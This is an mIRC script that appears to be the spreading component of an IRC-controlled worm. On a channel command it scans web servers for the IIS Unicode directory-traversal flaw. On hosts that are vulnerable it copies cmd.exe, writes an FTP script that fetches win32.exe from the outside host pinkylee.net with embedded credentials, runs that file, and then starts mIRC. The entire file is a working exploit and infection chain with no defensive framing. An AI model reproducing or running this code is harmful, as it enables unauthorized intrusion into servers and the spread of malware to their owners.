On 50:Text:.unicode*:#:{
  if ($3 == $null) { .msg $chan [unicode] incorrect parameters | .halt }
  if ($3 !== $me) { .halt }
  .unicode $2
}

Alias unicode {
  .timeruni off
  .sockclose unicode
  if ($1 == $null) { .msg %chan [unicode] Specified parameters are incorrect. (Use !unicode host timeout-in-seconds) | .halt }
  .msg %chan [unicode] Starting unicode scan on $1
  .set %codelist $lines(codelist.txt)
  .set %unihost $1
  .timeruni 0 3 /unicode2
}
Alias unicode2 {
  .sockclose unicode
  .sockopen unicode %unihost 80
  .dec %codelist
}

On 1:SockOpen:unicode:{
  if (%codelist == 0) { .msg $readini(ie6.dat, connect, chan) [unicode] Scan finished | .timeruni off | .sockclose unicode | .halt }
  if ($sock($sockname).status !== active) { .halt }
  .sockwrite -tn $sockname GET $read(codelist.txt,%codelist)
}
On 1:SockRead:unicode:{
  if ($sockerr > 0) return
  :nextread
  sockread %temp
  if ($sockbr == 0) return
  if (%temp == $null) %temp = -
  if (Directory of c:\ isin %temp) { .msg %chan [unicode] Found unicode exploit ( $+ %codelist $+ ) for $sock($sockname).ip $+ . Attempting to infect... | .timeruni off | .infect $sock($sockname).ip %codelist | .sockclose unicode | .halt }
  goto nextread
}

Alias infect {
  if ($2 == $null) { .msg $readini(ie6.dat, connect, chan) [infect] Syntax: /infect host unicodeline | .halt }
  .set %lol $read(codelist.txt,$2)
  .set %t1 $left(%lol,$calc($len(%lol) - 6))
  .sockclose infect
  .sockopen infect $1 80
  .set %step 1
  .msg %chan [infect] Attempting to infect $1 with %t1
}
On 1:SockOpen:infect:{
  if (%step == 1) { .sockwrite -tn $sockname GET %t1 $+ /c+copy+c:\winnt\system32\cmd.exe+c:\micro.exe }
  if (%step == 2) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+open+pinkylee.net+>+r0x0r2.exe }
  if (%step == 3) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+user+iis+>>+r0x0r2.exe }
  if (%step == 4) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+ownage+>>+r0x0r2.exe }
  if (%step == 5) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+bin+>>+r0x0r2.exe }
  if (%step == 6) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+get+win32.exe+win32.exe+>>+r0x0r2.exe }
  if (%step == 7) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+echo+bye+>>+r0x0r2.exe }
  if (%step == 8) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+ftp+-s:r0x0r2.exe+-n+-d }
  if (%step == 9) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+win32.exe }
  if (%step == 10) { .sockwrite -tn $sockname GET $replace(%t1,/winnt/system32/cmd.exe,/winnt/../micro.exe) $+ /c+c:\winnt\system32\mirc.exe | .sockclose $sockname | .echo -s [infect] Completed! | .sc }
}
on 1:sockread:infect:{
  if ($sockerr > 0) return
  :nextread
  sockread %temp
  if ($sockbr == 0) return
  if (%temp == $null) %temp = -
  if (CGI  isin %temp) { .msg $readini(ie6.dat, connect, chan) [infect] Step %step completed! | .inc %step 1 | .var %cal $sock($sockname).ip | .sockclose $sockname | .sockopen infect %cal 80 ] | .halt }
  goto nextread
}
